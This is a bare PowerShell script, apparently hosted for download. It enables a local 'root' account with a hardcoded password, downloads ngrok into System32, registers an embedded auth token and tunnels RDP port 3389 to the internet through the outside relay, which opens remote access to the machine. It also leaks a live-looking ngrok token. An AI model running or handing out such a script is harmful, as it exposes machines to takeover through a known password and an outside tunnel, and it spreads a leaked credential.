Hosted File:
Set-LocalUser -Name "root" -Password (ConvertTo-SecureString -AsPlainText "Youtube1234" -Force)
Get-LocalUser -Name "root" | Enable-LocalUser 
Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
tar xf ngrok.zip
Copy ngrok.exe C:\Windows\System32
cmd /c echo ./ngrok.exe authtoken "24ldSAnMSKXuVsYW90zeyAtCsuh_85URZEZzV4Xf3t4rCFRNs" >a.ps1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
